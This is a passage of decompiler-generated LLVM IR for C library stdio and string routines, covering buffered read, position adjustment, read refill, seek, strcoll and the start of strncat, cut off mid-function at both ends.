  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 1, 0, 47, 46, 59, 58, 57, 56, 22, 21, 15, 14, 55, 54, 13, 12, 24, 23, 7, 6, 5, 4, 3, 2, 11, 10, 9, 8, 53, 52, 38, 20, 51, 50, 19, 18, 17, 16, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134552147, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 23, 14, 15, 16, 17, 24, 25, 26, 18, 19 }
  uselistorder i32 52, { 7, 0, 12, 1, 2, 3, 4, 13, 14, 5, 10, 6, 8, 15, 11, 9 }
  uselistorder i32 22, { 8, 14, 2, 3, 4, 5, 6, 13, 12, 9, 10, 11, 15, 7, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80538e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80538d0, { 1, 0 }
  uselistorder label %dec_label_pc_8053893, { 1, 0 }
  uselistorder label %dec_label_pc_8053865, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80538f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80538f0, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_80538f6 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80538f6, i32* @ebx, align 4
  %v1_80538fe = bitcast i16* %arg1 to i8*
  %v2_80538fe = load i8, i8* %v1_80538fe, align 1
  %v3_80538fe = and i8 %v2_80538fe, 4
  %v4_80538fe = icmp eq i8 %v3_80538fe, 0
  %v1_8053901 = icmp eq i1 %v4_80538fe, false
  br i1 %v1_8053901, label %dec_label_pc_8053939, label %dec_label_pc_8053903

dec_label_pc_8053903:                             ; preds = %entry
  %v2_8053903 = icmp slt i32 %arg3, 0
  %v3_805390a = select i1 %v2_8053903, i32 2147483647, i32 %arg3
  %v1_8053913 = add i32 %v4_80538f6, 4
  %v2_8053913 = inttoptr i32 %v1_8053913 to i32*
  %v3_8053913 = load i32, i32* %v2_8053913, align 4
  %v3_8053916 = inttoptr i32 %arg2 to i32*
  %v4_8053916 = call i32 @__libc_read(i32 %v3_8053913, i32* %v3_8053916, i32 %v3_805390a)
  store i32 %v4_8053916, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_8053916, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_8053939, label %dec_label_pc_8053925

dec_label_pc_8053925:                             ; preds = %dec_label_pc_8053903
  %v1_805391e = icmp eq i32 %v4_8053916, 0
  %v4_8053923 = icmp eq i1 %v1_805391e, false
  %v0_8053925 = load i32, i32* @ebx, align 4
  %v1_8053925 = inttoptr i32 %v0_8053925 to i32*
  %v2_8053925 = load i32, i32* %v1_8053925, align 4
  br i1 %v4_8053923, label %dec_label_pc_8053931, label %dec_label_pc_8053929

dec_label_pc_8053929:                             ; preds = %dec_label_pc_8053925
  %v1_8053929 = or i32 %v2_8053925, 4
  %v1_805392c = trunc i32 %v1_8053929 to i16
  %v3_805392c = inttoptr i32 %v0_8053925 to i16*
  store i16 %v1_805392c, i16* %v3_805392c, align 2
  br label %dec_label_pc_8053939

dec_label_pc_8053931:                             ; preds = %dec_label_pc_8053925
  %v1_8053931 = or i32 %v2_8053925, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8053936 = trunc i32 %v1_8053931 to i16
  %v3_8053936 = inttoptr i32 %v0_8053925 to i16*
  store i16 %v1_8053936, i16* %v3_8053936, align 2
  br label %dec_label_pc_8053939

dec_label_pc_8053939:                             ; preds = %dec_label_pc_8053903, %entry, %dec_label_pc_8053929, %dec_label_pc_8053931
  %v0_805393a = load i32, i32* %ecx.global-to-local, align 4
  %v2_805393d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805393d, i32* @ebx, align 4
  ret i32 %v0_805393a

; uselistorder directives
  uselistorder i32 %v4_8053916, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053939, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8053948 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053948, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8053950 = load i16, i16* %arg1, align 2
  %v3_8053950 = zext i16 %v2_8053950 to i32
  store i32 %v3_8053950, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8053950, 4
  %v1_8053955 = zext i16 %tmp to i32
  %v2_8053955 = icmp eq i16 %tmp, 0
  br i1 %v2_8053955, label %dec_label_pc_8053984, label %dec_label_pc_805395a

dec_label_pc_805395a:                             ; preds = %entry
  %v1_805395c = add nsw i32 %v1_8053955, -1
  %v8_805395c = icmp eq i32 %v1_805395c, 0
  store i32 %v1_805395c, i32* @edx, align 4
  br i1 %v8_805395c, label %dec_label_pc_8053984, label %dec_label_pc_805395f

dec_label_pc_805395f:                             ; preds = %dec_label_pc_805395a
  %v3_805395f = and i32 %v3_8053950, 2048
  %v4_805395f = icmp eq i32 %v3_805395f, 0
  br i1 %v4_805395f, label %dec_label_pc_8053984, label %dec_label_pc_8053964

dec_label_pc_8053964:                             ; preds = %dec_label_pc_805395f
  %v6_8053964 = sub nsw i32 1, %v1_8053955
  %v7_8053964 = and i32 %v1_805395c, %v6_8053964
  %v8_8053964 = icmp slt i32 %v7_8053964, 0
  %v9_8053964 = icmp eq i16 %tmp, 2
  %v10_8053964 = icmp ult i16 %tmp, 2
  %v3_8053967 = icmp eq i1 %v10_8053964, %v8_8053964
  %v4_8053967 = icmp eq i1 %v9_8053964, false
  %v5_8053967 = and i1 %v4_8053967, %v3_8053967
  br i1 %v5_8053967, label %dec_label_pc_80539d8, label %dec_label_pc_8053969

dec_label_pc_8053969:                             ; preds = %dec_label_pc_8053964
  %v1_8053969 = add i32 %v4_8053948, 40
  %v2_8053969 = inttoptr i32 %v1_8053969 to i32*
  %v3_8053969 = load i32, i32* %v2_8053969, align 4
  %v4_8053969 = icmp eq i32 %v3_8053969, 0
  %v1_805396d = icmp eq i1 %v4_8053969, false
  br i1 %v1_805396d, label %dec_label_pc_80539d8, label %dec_label_pc_805396f

dec_label_pc_805396f:                             ; preds = %dec_label_pc_8053969
  %v1_805396f = add i32 %v4_8053948, 3
  %v2_805396f = inttoptr i32 %v1_805396f to i8*
  %v3_805396f = load i8, i8* %v2_805396f, align 1
  %v4_805396f = zext i8 %v3_805396f to i32
  %v2_8053973 = sub nsw i32 %v1_805395c, %v4_805396f
  %v1_8053975 = add i32 %v4_8053948, 44
  %v2_8053975 = inttoptr i32 %v1_8053975 to i32*
  %v3_8053975 = load i32, i32* %v2_8053975, align 4
  %v1_8053979 = add nsw i32 %v2_8053973, -1
  %tmp11 = icmp slt i32 %v3_8053975, 1
  br i1 %tmp11, label %dec_label_pc_8053984, label %dec_label_pc_805397e

dec_label_pc_805397e:                             ; preds = %dec_label_pc_805396f
  %v1_805397e = add i32 %v4_8053948, 2
  %v2_805397e = inttoptr i32 %v1_805397e to i8*
  %v3_805397e = load i8, i8* %v2_805397e, align 1
  %v4_805397e = zext i8 %v3_805397e to i32
  %v2_8053982 = sub nsw i32 %v1_8053979, %v4_805397e
  br label %dec_label_pc_8053984

dec_label_pc_8053984:                             ; preds = %dec_label_pc_805396f, %dec_label_pc_805395f, %dec_label_pc_805395a, %entry, %dec_label_pc_805397e
  %v0_8053999 = phi i32 [ %v1_8053979, %dec_label_pc_805396f ], [ %v1_805395c, %dec_label_pc_805395f ], [ 0, %dec_label_pc_805395a ], [ 0, %entry ], [ %v2_8053982, %dec_label_pc_805397e ]
  %v2_8053984 = and i32 %v3_8053950, 64
  %v3_8053984 = icmp eq i32 %v2_8053984, 0
  %storemerge.in.in.v = select i1 %v3_8053984, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8053948
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8053991 = add i32 %v4_8053948, 16
  %v3_8053991 = inttoptr i32 %v2_8053991 to i32*
  %v4_8053991 = load i32, i32* %v3_8053991, align 4
  %v5_8053991 = sub i32 %storemerge, %v4_8053991
  %v1_8053994 = inttoptr i32 %arg2 to i32*
  %v2_8053994 = load i32, i32* %v1_8053994, align 4
  store i32 %v2_8053994, i32* %ecx.global-to-local, align 4
  %v1_8053996 = add i32 %arg2, 4
  %v2_8053996 = inttoptr i32 %v1_8053996 to i32*
  %v3_8053996 = load i32, i32* %v2_8053996, align 4
  store i32 %v3_8053996, i32* %ebx.global-to-local, align 4
  %v2_8053999 = add i32 %v5_8053991, %v0_8053999
  store i32 %v2_8053999, i32* %esi.global-to-local, align 4
  %v5_80539ad = sub i32 %v2_8053994, %v2_8053999
  %v10_80539ad = icmp ult i32 %v2_8053994, %v2_8053999
  %v6_80539b1 = zext i1 %v10_80539ad to i32
  %tmp13 = icmp slt i32 %v2_8053999, 0
  %v2_805399e.neg = zext i1 %tmp13 to i32
  %v7_80539b1 = add i32 %v3_8053996, %v2_805399e.neg
  %v8_80539b1 = add i32 %v7_80539b1, %v6_80539b1
  store i32 %v8_80539b1, i32* @edx, align 4
  store i32 %v5_80539ad, i32* %v1_8053994, align 4
  %v0_80539b7 = load i32, i32* @edx, align 4
  %v1_80539b7 = load i32, i32* %edi.global-to-local, align 4
  %v2_80539b7 = add i32 %v1_80539b7, 4
  %v3_80539b7 = inttoptr i32 %v2_80539b7 to i32*
  store i32 %v0_80539b7, i32* %v3_80539b7, align 4
  %v0_80539ba = load i32, i32* %edi.global-to-local, align 4
  %v1_80539ba = add i32 %v0_80539ba, 4
  %v2_80539ba = inttoptr i32 %v1_80539ba to i32*
  %v3_80539ba = load i32, i32* %v2_80539ba, align 4
  %v4_80539ba = load i32, i32* %ebx.global-to-local, align 4
  %v5_80539bd = icmp slt i32 %v3_80539ba, %v4_80539ba
  br i1 %v5_80539bd, label %dec_label_pc_80539c7, label %dec_label_pc_80539bf

dec_label_pc_80539bf:                             ; preds = %dec_label_pc_8053984
  %v8_80539bf = icmp sgt i32 %v3_80539ba, %v4_80539ba
  br i1 %v8_80539bf, label %dec_label_pc_80539c5, label %dec_label_pc_80539c1

dec_label_pc_80539c1:                             ; preds = %dec_label_pc_80539bf
  %v1_80539c1 = inttoptr i32 %v0_80539ba to i32*
  %v2_80539c1 = load i32, i32* %v1_80539c1, align 4
  %v3_80539c1 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_80539c1, %v3_80539c1
  br i1 %tmp14, label %dec_label_pc_80539c5, label %dec_label_pc_80539c7

dec_label_pc_80539c5:                             ; preds = %dec_label_pc_80539c1, %dec_label_pc_80539bf
  %v0_80539c5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80539c5 = sub i32 0, %v0_80539c5
  store i32 %v1_80539c5, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80539c7

dec_label_pc_80539c7:                             ; preds = %dec_label_pc_80539c1, %dec_label_pc_8053984, %dec_label_pc_80539c5
  %v0_80539c7 = load i32, i32* %esi.global-to-local, align 4
  %v2_80539c7 = icmp slt i32 %v0_80539c7, 0
  %v1_80539c9 = icmp eq i1 %v2_80539c7, false
  br i1 %v1_80539c9, label %dec_label_pc_80539db, label %dec_label_pc_80539cb

dec_label_pc_80539cb:                             ; preds = %dec_label_pc_80539c7
  %v1_80539cb = call i32 @__errno_location(i32 %v2_8053999)
  %v1_80539d0 = inttoptr i32 %v1_80539cb to i32*
  store i32 75, i32* %v1_80539d0, align 4
  %v0_80539de.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80539db

dec_label_pc_80539d8:                             ; preds = %dec_label_pc_8053969, %dec_label_pc_8053964
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80539db

dec_label_pc_80539db:                             ; preds = %dec_label_pc_80539c7, %dec_label_pc_80539cb, %dec_label_pc_80539d8
  %v0_80539de = phi i32 [ %v0_80539c7, %dec_label_pc_80539c7 ], [ %v0_80539de.pre, %dec_label_pc_80539cb ], [ -1, %dec_label_pc_80539d8 ]
  ret i32 %v0_80539de

; uselistorder directives
  uselistorder i32 %v4_80539ba, { 1, 0 }
  uselistorder i32 %v3_80539ba, { 1, 0 }
  uselistorder i32 %v2_8053999, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_805395c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8053948, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80539db, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80539c7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053984, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_80539e4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80539ec = add i32 %arg1, 8
  %v2_80539ec = inttoptr i32 %v1_80539ec to i32*
  %v3_80539ec = load i32, i32* %v2_80539ec, align 4
  store i32 %v3_80539ec, i32* %edx.global-to-local, align 4
  %v1_80539ef = add i32 %arg1, 12
  %v2_80539ef = inttoptr i32 %v1_80539ef to i32*
  %v3_80539ef = load i32, i32* %v2_80539ef, align 4
  %v2_80539f2 = sub i32 %v3_80539ef, %v3_80539ec
  %v3_80539f7 = inttoptr i32 %arg1 to i16*
  %v4_80539f7 = call i32 @__stdio_READ(i16* %v3_80539f7, i32 %v3_80539ec, i32 %v2_80539f2)
  %v0_80539fc = load i32, i32* @ebx, align 4
  %v1_80539fc = add i32 %v0_80539fc, 8
  %v2_80539fc = inttoptr i32 %v1_80539fc to i32*
  %v3_80539fc = load i32, i32* %v2_80539fc, align 4
  store i32 %v3_80539fc, i32* %edx.global-to-local, align 4
  %v2_80539ff = add i32 %v0_80539fc, 16
  %v3_80539ff = inttoptr i32 %v2_80539ff to i32*
  store i32 %v3_80539fc, i32* %v3_80539ff, align 4
  %v0_8053a02 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053a02 = add i32 %v0_8053a02, %v4_80539f7
  store i32 %v2_8053a02, i32* %edx.global-to-local, align 4
  %v1_8053a04 = load i32, i32* @ebx, align 4
  %v2_8053a04 = add i32 %v1_8053a04, 20
  %v3_8053a04 = inttoptr i32 %v2_8053a04 to i32*
  store i32 %v2_8053a02, i32* %v3_8053a04, align 4
  store i32 %v0_80539e4, i32* @ebx, align 4
  ret i32 %v4_80539f7

; uselistorder directives
  uselistorder i32 %v4_80539f7, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8053a0c = load i32, i32* @ebx, align 4
  %v4_8053a10 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053a10, i32* @ebx, align 4
  %v2_8053a18 = load i16, i16* %arg1, align 2
  %v3_8053a18 = zext i16 %v2_8053a18 to i32
  %v2_8053a1b = and i32 %v3_8053a18, %arg2
  %v3_8053a1b = icmp eq i32 %v2_8053a1b, 0
  %v1_8053a1d = icmp eq i1 %v3_8053a1b, false
  br i1 %v1_8053a1d, label %dec_label_pc_8053a2b, label %dec_label_pc_8053a1f

dec_label_pc_8053a1f:                             ; preds = %entry
  %v1_8053a1f = and i32 %v3_8053a18, 2176
  %v2_8053a1f = icmp eq i32 %v1_8053a1f, 0
  %v1_8053a24 = icmp eq i1 %v2_8053a1f, false
  br i1 %v1_8053a24, label %dec_label_pc_8053a32, label %dec_label_pc_8053a26

dec_label_pc_8053a26:                             ; preds = %dec_label_pc_8053a1f
  %v2_8053a26 = or i32 %v3_8053a18, %arg2
  %v1_8053a28 = trunc i32 %v2_8053a26 to i16
  store i16 %v1_8053a28, i16* %arg1, align 2
  %v0_8053a2b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053a2b

dec_label_pc_8053a2b:                             ; preds = %entry, %dec_label_pc_8053a26
  %v0_8053a51 = phi i32 [ %v4_8053a10, %entry ], [ %v0_8053a2b.pre, %dec_label_pc_8053a26 ]
  %v1_8053a2b = inttoptr i32 %v0_8053a51 to i16*
  %v2_8053a2b = load i16, i16* %v1_8053a2b, align 2
  %v2_8053a2e = and i16 %v2_8053a2b, 16
  %v3_8053a2e = icmp eq i16 %v2_8053a2e, 0
  br i1 %v3_8053a2e, label %dec_label_pc_8053a4a, label %dec_label_pc_8053a32

dec_label_pc_8053a32:                             ; preds = %dec_label_pc_8053a2b, %dec_label_pc_8053a1f
  %v1_8053a32 = call i32 @__errno_location(i32 %v0_8053a0c)
  %v1_8053a37 = inttoptr i32 %v1_8053a32 to i32*
  store i32 9, i32* %v1_8053a37, align 4
  br label %dec_label_pc_8053a3d

dec_label_pc_8053a3d:                             ; preds = %dec_label_pc_8053a4e, %dec_label_pc_8053a32
  %v0_8053a3d = load i32, i32* @ebx, align 4
  %v1_8053a3d = inttoptr i32 %v0_8053a3d to i32*
  %v2_8053a3d = load i32, i32* %v1_8053a3d, align 4
  %v1_8053a3f = or i32 %v2_8053a3d, 8
  %v1_8053a42 = trunc i32 %v1_8053a3f to i16
  %v3_8053a42 = inttoptr i32 %v0_8053a3d to i16*
  store i16 %v1_8053a42, i16* %v3_8053a42, align 2
  br label %dec_label_pc_8053a76

dec_label_pc_8053a4a:                             ; preds = %dec_label_pc_8053a2b
  %v2_8053a4a = and i16 %v2_8053a2b, 64
  %v3_8053a4a = icmp eq i16 %v2_8053a4a, 0
  br i1 %v3_8053a4a, label %dec_label_pc_8053a6c, label %dec_label_pc_8053a4e

dec_label_pc_8053a4e:                             ; preds = %dec_label_pc_8053a4a
  %v2_8053a52 = call i32 @__stdio_wcommit(i32 %v0_8053a51)
  %v1_8053a5a = icmp eq i32 %v2_8053a52, 0
  %v1_8053a5c = icmp eq i1 %v1_8053a5a, false
  br i1 %v1_8053a5c, label %dec_label_pc_8053a3d, label %dec_label_pc_8053a5e

dec_label_pc_8053a5e:                             ; preds = %dec_label_pc_8053a4e
  %v0_8053a5e = load i32, i32* @ebx, align 4
  %v1_8053a5e = add i32 %v0_8053a5e, 8
  %v2_8053a5e = inttoptr i32 %v1_8053a5e to i32*
  %v3_8053a5e = load i32, i32* %v2_8053a5e, align 4
  %v2_8053a61 = add i32 %v0_8053a5e, 28
  %v3_8053a61 = inttoptr i32 %v2_8053a61 to i32*
  store i32 %v3_8053a5e, i32* %v3_8053a61, align 4
  %v0_8053a64 = load i32, i32* @ebx, align 4
  %v1_8053a64 = inttoptr i32 %v0_8053a64 to i32*
  %v2_8053a64 = load i32, i32* %v1_8053a64, align 4
  %v2_8053a64.tr = trunc i32 %v2_8053a64 to i16
  %v1_8053a69 = and i16 %v2_8053a64.tr, -65
  %v3_8053a69 = inttoptr i32 %v0_8053a64 to i16*
  store i16 %v1_8053a69, i16* %v3_8053a69, align 2
  %v0_8053a6c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053a6c

dec_label_pc_8053a6c:                             ; preds = %dec_label_pc_8053a4a, %dec_label_pc_8053a5e
  %v2_8053a71 = phi i32 [ %v0_8053a51, %dec_label_pc_8053a4a ], [ %v0_8053a6c.pre, %dec_label_pc_8053a5e ]
  %v1_8053a6c = inttoptr i32 %v2_8053a71 to i32*
  %v2_8053a6c = load i32, i32* %v1_8053a6c, align 4
  %v1_8053a6e = or i32 %v2_8053a6c, 1
  %v1_8053a71 = trunc i32 %v1_8053a6e to i16
  %v3_8053a71 = inttoptr i32 %v2_8053a71 to i16*
  store i16 %v1_8053a71, i16* %v3_8053a71, align 2
  br label %dec_label_pc_8053a76

dec_label_pc_8053a76:                             ; preds = %dec_label_pc_8053a3d, %dec_label_pc_8053a6c
  %storemerge = phi i32 [ 0, %dec_label_pc_8053a6c ], [ -1, %dec_label_pc_8053a3d ]
  %v2_8053a76 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053a76, i32* @edx, align 4
  store i32 %v0_8053a0c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8053a18, { 0, 2, 1 }
  uselistorder i32 %v0_8053a0c, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 0, { 0, 8, 2, 1, 9, 6, 10, 7, 11, 12, 13, 14, 15, 16, 17, 3, 4, 5 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053a76, { 1, 0 }
  uselistorder label %dec_label_pc_8053a6c, { 1, 0 }
  uselistorder label %dec_label_pc_8053a2b, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8053a88 = add i32 %tmp5, 4
  %v2_8053a88 = inttoptr i32 %v1_8053a88 to i32*
  %v3_8053a88 = load i32, i32* %v2_8053a88, align 4
  %v2_8053a8b = load i32, i32* %arg2, align 4
  %v1_8053a91 = add i32 %arg1, 4
  %v2_8053a91 = inttoptr i32 %v1_8053a91 to i32*
  %v3_8053a91 = load i32, i32* %v2_8053a91, align 4
  %v4_8053a94 = call i32 @__libc_lseek64(i32 %v3_8053a91, i32 %v2_8053a8b, i32 %v3_8053a88, i32 %arg3)
  %v0_8053a9c = load i32, i32* @edx, align 4
  %v2_8053a9c = icmp slt i32 %v0_8053a9c, 0
  store i32 %v4_8053a94, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053a9c, label %dec_label_pc_8053aa9, label %dec_label_pc_8053aa2

dec_label_pc_8053aa2:                             ; preds = %entry
  %v1_8053aa2 = load i32, i32* @ebx, align 4
  %v2_8053aa2 = inttoptr i32 %v1_8053aa2 to i32*
  store i32 %v4_8053a94, i32* %v2_8053aa2, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8053aa6 = load i32, i32* @edx, align 4
  %v1_8053aa6 = load i32, i32* @ebx, align 4
  %v2_8053aa6 = add i32 %v1_8053aa6, 4
  %v3_8053aa6 = inttoptr i32 %v2_8053aa6 to i32*
  store i32 %v0_8053aa6, i32* %v3_8053aa6, align 4
  %v0_8053aaa.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053aa9

dec_label_pc_8053aa9:                             ; preds = %entry, %dec_label_pc_8053aa2
  %v0_8053aaa = phi i32 [ %v4_8053a94, %entry ], [ %v0_8053aaa.pre, %dec_label_pc_8053aa2 ]
  ret i32 %v0_8053aaa

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8053aa9, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8053ab2 = ptrtoint i8* %arg1 to i32
  %v4_8053aba.pre = load i32, i32* @eax, align 4
  %v8_8053aba.pre = load i1, i1* @df, align 1
  %v9_8053aba = select i1 %v8_8053aba.pre, i32 -1, i32 1
  br label %dec_label_pc_8053aba

dec_label_pc_8053aba:                             ; preds = %dec_label_pc_8053abe, %entry
  %v20_8053abb = phi i32 [ %v23_8053abb, %dec_label_pc_8053abe ], [ %arg2, %entry ]
  %v4_8053aba = phi i32 [ %v6_8053aba, %dec_label_pc_8053abe ], [ %v4_8053aba.pre, %entry ]
  %v7_8053aba = phi i32 [ %v10_8053aba, %dec_label_pc_8053abe ], [ %v4_8053ab2, %entry ]
  %v1_8053aba = inttoptr i32 %v7_8053aba to i8*
  %v2_8053aba = load i8, i8* %v1_8053aba, align 1
  %v3_8053abb = inttoptr i32 %v20_8053abb to i8*
  %v4_8053abb = load i8, i8* %v3_8053abb, align 1
  %v15_8053abb = icmp eq i8 %v2_8053aba, %v4_8053abb
  %v1_8053abc = icmp eq i1 %v15_8053abb, false
  br i1 %v1_8053abc, label %dec_label_pc_8053ac6, label %dec_label_pc_8053abe

dec_label_pc_8053abe:                             ; preds = %dec_label_pc_8053aba
  %v3_8053aba = zext i8 %v2_8053aba to i32
  %v5_8053aba = and i32 %v4_8053aba, -256
  %v6_8053aba = or i32 %v3_8053aba, %v5_8053aba
  %v23_8053abb = add i32 %v20_8053abb, %v9_8053aba
  %v10_8053aba = add i32 %v7_8053aba, %v9_8053aba
  %v4_8053abe = icmp eq i8 %v2_8053aba, 0
  %v1_8053ac0 = icmp eq i1 %v4_8053abe, false
  br i1 %v1_8053ac0, label %dec_label_pc_8053aba, label %dec_label_pc_8053aca

dec_label_pc_8053ac6:                             ; preds = %dec_label_pc_8053aba
  br label %dec_label_pc_8053aca

dec_label_pc_8053aca:                             ; preds = %dec_label_pc_8053abe, %dec_label_pc_8053ac6
  %storemerge = phi i32 [ 1, %dec_label_pc_8053ac6 ], [ 0, %dec_label_pc_8053abe ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8053aba, { 1, 2, 0 }
  uselistorder i32 %v9_8053aba, { 1, 0 }
  uselistorder label %dec_label_pc_8053aca, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053ad3 = load i32, i32* @esi, align 4
  store i32 %v0_8053ad3, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8053ad7 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8053ad7, i32* %esi.global-to-local, align 4
  %v4_8053adf = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8053ae3 = call i32 @_strlen(i8* %v4_8053adf)
  %v2_8053ae5 = add i32 %tmp, -1
  store i32 %v2_8053ae5, i32* %edi.global-to-local, align 4
  %v8_8053ae913 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053ae913, label %dec_label_pc_8053af4, label %dec_label_pc_8053aec.lr.ph

dec_label_pc_8053aec.lr.ph:                       ; preds = %entry
  %v4_8053aec.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8053aec.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8053aec

dec_label_pc_8053aec:                             ; preds = %dec_label_pc_8053aec.lr.ph, %dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge
  %v8_8053aec = phi i1 [ %v8_8053aec.pre, %dec_label_pc_8053aec.lr.ph ], [ %v5_8053aed, %dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge ]
  %v4_8053aec = phi i32 [ %v4_8053aec.pre, %dec_label_pc_8053aec.lr.ph ], [ %v0_8053aee, %dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge ]
  %v2_8053af615 = phi i32 [ %v2_8053ae5, %dec_label_pc_8053aec.lr.ph ], [ %v7_8053aed, %dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge ]
  %v0_8053aec = load i32, i32* %esi.global-to-local, align 4
  %v1_8053aec = inttoptr i32 %v0_8053aec to i8*
  %v2_8053aec = load i8, i8* %v1_8053aec, align 1
  %v3_8053aec = zext i8 %v2_8053aec to i32
  %v5_8053aec = and i32 %v4_8053aec, -256
  %v6_8053aec = or i32 %v5_8053aec, %v3_8053aec
  store i32 %v6_8053aec, i32* %eax.global-to-local, align 4
  %v9_8053aec = select i1 %v8_8053aec, i32 -1, i32 1
  %v10_8053aec = add i32 %v9_8053aec, %v0_8053aec
  store i32 %v10_8053aec, i32* %esi.global-to-local, align 4
  %v3_8053aed = inttoptr i32 %v2_8053af615 to i8*
  store i8 %v2_8053aec, i8* %v3_8053aed, align 1
  %v4_8053aed = load i32, i32* %edi.global-to-local, align 4
  %v5_8053aed = load i1, i1* @df, align 1
  %v6_8053aed = select i1 %v5_8053aed, i32 -1, i32 1
  %v7_8053aed = add i32 %v6_8053aed, %v4_8053aed
